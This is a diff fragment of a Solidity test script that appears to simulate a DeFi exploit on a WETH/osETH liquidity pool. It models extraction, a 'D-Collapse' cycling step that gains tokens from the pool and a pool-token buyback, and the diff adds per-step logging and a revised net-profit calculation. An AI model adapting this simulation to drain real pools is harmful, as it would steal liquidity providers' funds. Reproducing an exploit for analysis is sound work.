+        console.log("--- Step 2: D-Collapse Cycling ---");
+        console.log("WETH gained from pool:", wethGainStep2);
+        console.log("osETH gained from pool:", osethGainStep2);
 
-        // Step 3: BPT buyback (per-token costs)
+        // Print pre-Phase3 internal balances (matching EXP format)
+        console.log("[SP] wethInternal before Phase3:", wethOut + wethGainStep2);
+        console.log("[SP] osethInternal before Phase3:", osethOut + osethGainStep2);
+        console.log("[SP] postStep1Supply:", postStep1Supply);
+        console.log("[SP] bW after cycling:", bW);
+        console.log("[SP] bO after cycling:", bO);
+
+        // Step 3: BPT buyback (per-token costs) - use debug version for per-step logging
         uint256 bptTarget = totalBPT * 10030 / 10000;
         (uint256 wethCostStep3, uint256 osethCostStep3, uint256 bptBought) =
-            _simulateStep3RepaymentDetailed(bW, bO, bptTarget, postStep1Supply);
+            _simulateStep3RepaymentDetailedWithLog(bW, bO, bptTarget, postStep1Supply);
         console.log("--- Step 3: BPT Buyback ---");
+        console.log("[SP] Phase3 WETH cost:", wethCostStep3);
+        console.log("[SP] Phase3 osETH cost:", osethCostStep3);
         console.log("WETH spent on buyback:", wethCostStep3);
         console.log("osETH spent on buyback:", osethCostStep3);
         console.log("BPT bought back:", bptBought);
+        console.log("[SP] wethInternal after Phase3:", wethOut + wethGainStep2 - wethCostStep3);
+        console.log("[SP] osethInternal after Phase3:", osethOut + osethGainStep2 - osethCostStep3);
 
-        // Net token deltas
-        uint256 netWeth = wethOut - wethCostStep2 - wethCostStep3;
-        uint256 netOseth = osethOut - osethCostStep2 - osethCostStep3;
+        // Net token deltas: Phase1 extraction + Phase2 cycling gain - Phase3 buyback cost
+        uint256 netWeth = wethOut + wethGainStep2 - wethCostStep3;
+        uint256 netOseth = osethOut + osethGainStep2 - osethCostStep3;
         uint256 netBpt = bptBought - bptSold;
 
         console.log("=== NET TOKEN DELTAS ===");
